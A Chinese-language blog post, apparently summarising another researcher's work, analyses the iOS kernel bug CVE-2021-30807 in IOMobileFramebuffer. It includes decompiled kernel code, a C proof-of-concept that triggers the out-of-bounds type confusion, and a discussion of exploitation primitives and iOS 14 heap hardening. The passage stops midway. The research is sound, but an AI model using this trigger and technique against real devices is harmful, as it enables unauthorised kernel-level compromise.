<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"buffer0verflooow.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言这个漏洞是从应用程序沙箱中逆向IOServices时发现的，这是一个存在于AppleCLCD&#x2F;IOMobileFrameBuffer中的漏洞。  原文链接: https:&#x2F;&#x2F;jsherman212.github.io&#x2F;2021&#x2F;11&#x2F;28&#x2F;popping_ios14_with_iomfb.html  漏洞原理该漏洞位于AppleCLCD&#x2F;IOMFB的外部方法 83 ，即IOMobileFram">
<meta property="og:type" content="article">
<meta property="og:title" content="iOS LPE-CVE-2021-30807">
<meta property="og:url" content="https://buffer0verflooow.github.io/2021/12/06/iOS-LPE-CVE-2021-30807/index.html">
<meta property="og:site_name" content="buffer0verflooow - Blog">
<meta property="og:description" content="前言这个漏洞是从应用程序沙箱中逆向IOServices时发现的，这是一个存在于AppleCLCD&#x2F;IOMobileFrameBuffer中的漏洞。  原文链接: https:&#x2F;&#x2F;jsherman212.github.io&#x2F;2021&#x2F;11&#x2F;28&#x2F;popping_ios14_with_iomfb.html  漏洞原理该漏洞位于AppleCLCD&#x2F;IOMFB的外部方法 83 ，即IOMobileFram">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/metadata_chunk_relationship.png">
<meta property="og:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture.png">
<meta property="og:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_fig1.png">
<meta property="og:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/stage1_16mb.png">
<meta property="og:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2.png">
<meta property="og:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent.png">
<meta property="og:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/iosurface_bigger_picture_stage2_adjacent_overlap.png">
<meta property="article:published_time" content="2021-12-06T14:12:44.000Z">
<meta property="article:modified_time" content="2021-12-11T15:39:49.701Z">
<meta property="article:author" content="buffer0verflooow">
<meta property="article:tag" content="ios">
<meta property="article:tag" content="LPE">
<meta property="article:tag" content="IOServices">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jsherman212.github.io/assets/popping_ios14_with_iomfb/metadata_chunk_relationship.png">


<link rel="canonical" href="https://buffer0verflooow.github.io/2021/12/06/iOS-LPE-CVE-2021-30807/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://buffer0verflooow.github.io/2021/12/06/iOS-LPE-CVE-2021-30807/","path":"2021/12/06/iOS-LPE-CVE-2021-30807/","title":"iOS LPE-CVE-2021-30807"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>iOS LPE-CVE-2021-30807 | buffer0verflooow - Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">buffer0verflooow - Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E7%BB%8F%E5%8E%86"><span class="nav-number">3.</span> <span class="nav-text">踩坑经历</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#kheaps"><span class="nav-number">3.1.</span> <span class="nav-text">kheaps</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zone%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%92%8C%E5%B0%81%E5%AD%98"><span class="nav-number">3.2.</span> <span class="nav-text">zone垃圾收集和封存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pipe%E7%AE%A1%E9%81%93"><span class="nav-number">3.3.</span> <span class="nav-text">Pipe管道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oob-surface-surface-id%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">3.4.</span> <span class="nav-text">oob_surface-&gt;surface_id存在的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%9C%E6%B5%8B%E6%B8%B8%E6%88%8F"><span class="nav-number">3.5.</span> <span class="nav-text">猜测游戏</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-0"><span class="nav-number">4.1.</span> <span class="nav-text">Stage 0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-1-%E5%A1%91%E5%BD%A2%E5%86%85%E6%A0%B8VA"><span class="nav-number">4.2.</span> <span class="nav-text">Stage 1: 塑形内核VA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">4.3.</span> <span class="nav-text">Stage 2: 信息泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-3-iOS14-7%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E6%8A%80%E5%B7%A7"><span class="nav-number">4.4.</span> <span class="nav-text">Stage 3: iOS14.7一个简单技巧</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">buffer0verflooow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2021/12/06/iOS-LPE-CVE-2021-30807/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="iOS LPE-CVE-2021-30807 | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          iOS LPE-CVE-2021-30807
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-12-06 22:12:44" itemprop="dateCreated datePublished" datetime="2021-12-06T22:12:44+08:00">2021-12-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-12-11 23:39:49" itemprop="dateModified" datetime="2021-12-11T23:39:49+08:00">2021-12-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个漏洞是从应用程序沙箱中逆向IOServices时发现的，这是一个存在于<code>AppleCLCD/IOMobileFrameBuffer</code>中的漏洞。</p>
<blockquote>
<p>原文链接: <a target="_blank" rel="noopener" href="https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html">https://jsherman212.github.io/2021/11/28/popping_ios14_with_iomfb.html</a></p>
</blockquote>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>该漏洞位于<code>AppleCLCD/IOMFB</code>的外部方法 83 ，即<code>IOMobileFramebufferUserClient::s_displayed_fb_surface()</code>函数中。下面是从iOS 14 beta中逆向得到的结果:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferUserClient::s_displayed_fb_surface</span><span class="params">(IOUserClient **a1, __int64 a2, IOExternalMethodArguments_s *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [xsp+10h] [xbp-30h]</span></span><br><span class="line">  <span class="type">bool</span> v5; <span class="comment">// [xsp+1Bh] [xbp-25h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [xsp+1Ch] [xbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [xsp+20h] [xbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v_retval; <span class="comment">// [xsp+24h] [xbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v_retval = <span class="number">0xE00002C1</span>;</span><br><span class="line">  v7 = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v4 = IOUserClient::<span class="built_in">copyClientEntitlement</span>(a1[<span class="number">29</span>], <span class="string">&quot;com.apple.private.allow-explicit-graphics-priority&quot;</span>, args);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = v4 == gOSBooleanTrue;</span><br><span class="line">    (*(*v4 + <span class="number">40LL</span>))(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v_retval = IOMobileFramebufferUserClient::<span class="built_in">get_displayed_surface</span>(a1, &amp;v6, *args-&gt;scalarInput);</span><br><span class="line">    *args-&gt;scalarOutput = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v_retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入<code>IOMobileFramebufferUserClient::get_displayed_surface()</code>函数:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferUserClient::get_displayed_surface</span><span class="params">(IOMobileFramebufferUserClient *<span class="keyword">this</span>, <span class="type">unsigned</span> <span class="type">int</span> *a2, <span class="type">unsigned</span> <span class="type">int</span> scalar0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (*(**(<span class="keyword">this</span> + <span class="number">27</span>) + <span class="number">0x798LL</span>))(*(<span class="keyword">this</span> + <span class="number">27</span>), *(<span class="keyword">this</span> + <span class="number">29</span>), a2, scalar0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>+0x798 处的函数是<code>IOMobileFramebufferLegacy::get_displayed_surface()</code>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">IOMobileFramebufferLegacy::get_displayed_surface</span><span class="params">(IOMobileFramebufferLegacy *<span class="keyword">this</span>, task *a2, <span class="type">unsigned</span> <span class="type">int</span> *a3, <span class="type">unsigned</span> <span class="type">int</span> scalar0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v_retval; <span class="comment">// [xsp+10h] [xbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v_retval = <span class="number">0xE00002BC</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">this</span> + scalar0 + <span class="number">331</span>) &amp;&amp; *(<span class="keyword">this</span> + <span class="number">366</span>) )</span><br><span class="line">    v_retval = IOSurfaceRoot::<span class="built_in">copyPortNameForSurfaceInTask</span>(*(<span class="keyword">this</span> + <span class="number">366</span>), a2, *(<span class="keyword">this</span> + scalar0 + <span class="number">331</span>), a3);</span><br><span class="line">  <span class="keyword">return</span> v_retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从下面的汇编代码可以看出，调用<code>IOSurfaceRoot::copyPortNameForSurfaceInTask()</code>函数时，没有对数组的下标运算进行安全检查，以判断是否造成越界，故造成内核类型混淆(这一点需要结合IOSurface的机制来看):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FFFFFFF00970ADDC LDR             X8, [SP,#0x30+v_this]</span><br><span class="line">FFFFFFF00970ADE0 LDR             X0, [X8,#0xB70] ; this</span><br><span class="line">FFFFFFF00970ADE4 LDUR            X1, [X29,#var_10] ; task *</span><br><span class="line">FFFFFFF00970ADE8 ADD             X9, X8, #0xA58</span><br><span class="line">FFFFFFF00970ADEC LDR             W10, [SP,#0x30+v_scalar0]</span><br><span class="line">FFFFFFF00970ADF0 MOV             X11, X10</span><br><span class="line">FFFFFFF00970ADF4 ADD             X9, X9, X11,LSL#3</span><br><span class="line">FFFFFFF00970ADF8 LDR             X2, [X9] ; IOSurface *</span><br><span class="line">FFFFFFF00970ADFC LDR             X3, [SP,#0x30+var_18] ; unsigned int *</span><br><span class="line">FFFFFFF00970AE00 BL              IOSurfaceRoot::copyPortNameForSurfaceInTask(task *,IOSurface *,uint *)</span><br></pre></td></tr></table></figure>

<p>至于触发就很简单了，下面是POC:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">trigger_clcd_vuln</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="type">kern_return_t</span> ret;</span><br><span class="line">  <span class="type">io_connect_t</span> shared_user_client_conn = MACH_PORT_NULL;</span><br><span class="line">  <span class="type">int</span> type = <span class="number">2</span>;</span><br><span class="line">  <span class="type">io_service_t</span> service = <span class="built_in">IOServiceGetMatchingService</span>(kIOMasterPortDefault,</span><br><span class="line">                            <span class="built_in">IOServiceMatching</span>(<span class="string">&quot;IOMobileFramebuffer&quot;</span>));</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>(service == MACH_PORT_NULL) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open service\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;service: 0x%x\n&quot;</span>, service);</span><br><span class="line"></span><br><span class="line">  ret = <span class="built_in">IOServiceOpen</span>(service, <span class="built_in">mach_task_self</span>(), type, &amp;shared_user_client_conn);</span><br><span class="line">  <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to open userclient: %s\n&quot;</span>, <span class="built_in">mach_error_string</span>(ret));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;client: 0x%x\n&quot;</span>, shared_user_client_conn);</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call externalMethod\n&quot;</span>);</span><br><span class="line">  <span class="type">uint64_t</span> scalars[<span class="number">4</span>] = &#123; <span class="number">0x0</span> &#125;;</span><br><span class="line">  scalars[<span class="number">0</span>] = <span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> output_scalars[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  <span class="type">uint32_t</span> output_scalars_size = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;call s_default_fb_surface\n&quot;</span>);</span><br><span class="line">  ret = <span class="built_in">IOConnectCallMethod</span>(shared_user_client_conn, <span class="number">83</span>,</span><br><span class="line">            scalars, <span class="number">1</span>,</span><br><span class="line">    	      <span class="literal">NULL</span>, <span class="number">0</span>, <span class="comment">//input, input_size,</span></span><br><span class="line">    		    output_scalars, &amp;output_scalars_size,</span><br><span class="line">        	  <span class="literal">NULL</span>, <span class="literal">NULL</span>); <span class="comment">//output, &amp;output_size);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(ret != KERN_SUCCESS) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;failed to call external method: 0x%x --&gt; %s\n&quot;</span>, ret, <span class="built_in">mach_error_string</span>(ret));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;external method returned KERN_SUCCESS\n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">  <span class="built_in">IOServiceClose</span>(shared_user_client_conn);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="踩坑经历"><a href="#踩坑经历" class="headerlink" title="踩坑经历"></a>踩坑经历</h1><p>iOS内核可以把任意一个对象解释为IOSurface</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">IOSurfaceSendRight *__fastcall <span class="title">IOSurfaceSendRight::init_IOSurfaceRoot___IOSurface</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceSendRight *a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurfaceRoot *a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        IOSurface *oob_surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  IOSurfaceSendRight *v6; <span class="comment">// x20</span></span><br><span class="line">  IOSurface *surface; <span class="comment">// x21</span></span><br><span class="line"></span><br><span class="line">  v6 = OSObject::<span class="built_in">init</span>();</span><br><span class="line">  a1-&gt;m.surface_root = a2;</span><br><span class="line">  surface = a1-&gt;m.surface;</span><br><span class="line">  a1-&gt;m.surface = oob_surface;</span><br><span class="line">  <span class="keyword">if</span> ( oob_surface )</span><br><span class="line">    (oob_surface-&gt;retain)(oob_surface);</span><br><span class="line">  <span class="keyword">if</span> ( surface )</span><br><span class="line">    (surface-&gt;release_0)(surface);</span><br><span class="line">  IOSurface::<span class="built_in">clientRetain</span>(oob_surface);</span><br><span class="line">  IOSurface::<span class="built_in">increment_use_count</span>(oob_surface);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>IOSurface::clientRetain()</code>函数实现如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SInt32 __fastcall <span class="title">IOSurface::clientRetain</span><span class="params">(IOSurface *surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">OSIncrementAtomic</span>(&amp;surface-&gt;client_retain_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <code>IOSurface::increment_use_count()</code>函数实现如下:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">IOSurface::increment_use_count</span><span class="params">(IOSurface *surface)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">OSIncrementAtomic</span>((surface-&gt;qwordC0 + <span class="number">0x14LL</span>));</span><br><span class="line">    surface = surface-&gt;qword3F0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( surface );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 上面的代码中有两个原语:</p>
<ul>
<li>IOSurface::clientRetain会增加oob_surface指向的对象的偏移量为0x354(client_retain_count)处的值。</li>
<li>通过控制oob_surface的偏移量0xc0处的指针，IOSurface::increment_use_count在内核内存中提供了一个任意的32位增量。</li>
</ul>
<p>对于漏洞利用来讲，首先要伪造一个真实的IOSurface对象，否则会在 <code>IOSurfaceSendRight::init()</code>函数中导致Panic。因此伪造的IOSurface对象需要满足以下几点：</p>
<ol>
<li>oob_surface应该指向一个IOKit对象，因为IOSurfaceSendRight::init在其vtable上调用了偏移量为0x20的虚拟方法。只要oob_surface继承自OSObject，这就会调用 retain，这是一个无害的操作。</li>
<li>oob_surface的大小应该至少是0x358字节，因为IOSurface::clientRetain增加的字段是在偏移量0x354。如果oob_surface指向的对象小于这个大小，我们就有可能修改一个已释放的区域元素或碰到一个未映射的页面。</li>
<li>oob_surface必须有一个有效的内核指针，用于IOSurface::increment_use_count在偏移量0xc0。在偏移量0x3f0处，该指针可以是有效的，也可以是NULL。因此，ob_surface指向的对象应该大于0x3f8字节，原因与前一点相同。</li>
</ol>
<p>由于iOS 14通过引入kheaps和sequestering大大强化了内存分配器，因此，无论伪造的对象是否继承自OSObject，堆喷这个操作都存在着问题。</p>
<h2 id="kheaps"><a href="#kheaps" class="headerlink" title="kheaps"></a>kheaps</h2><p>在高层次上，Kheaps通过给数据、内核、kext和临时内存分配各自的kalloc.*区域，使得它们之间相互隔离。这些kheaps分别被称为KHEAP_DATA_BUFFERS、KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP。</p>
<p>zone map实际上是由三个不同的子地图组成的。一个子图是KHEAP_DEFAULT、KHEAP_KEXT和KHEAP_TEMP的区域，而另一个是KHEAP_DATA_BUFFERS的区域。第三个子图对我们来说并不重要。KHEAP_DATA_BUFFERS是为那些内容为纯字节或由用户空间控制的分配而准备的。KHEAP_DEFAULT是XNU分配的Kheap，而KHEAP_KEXT是内核扩展分配的Kheap。KHEAP_TEMP（只是KHEAP_DEFAULT的别名）是指在系统调用中进行的分配，在返回EL0之前被释放。因此，在iOS 14及以上版本中，一个500字节的IOKit对象属于kext.kalloc.512，而一个同样大小的管道缓冲区则属于data.kalloc.512。在iOS 13及以下版本中，这两个分配都是kalloc.512。(在iOS 15上，似乎KHEAP_TEMP已经被移除）。</p>
<p>在iOS 13及以下版本中，滥用zone垃圾收集将一个页面从一个区域移动到另一个区域是利用UAF的标准。iOS 14管道缓冲区被隔离在数据缓冲区的Kheap中。通过管道缓冲区（或任何其他纯数据手段）喷射假的内核对象并希望通过垃圾收集 “重新利用 “这些页面已经行不通了。</p>
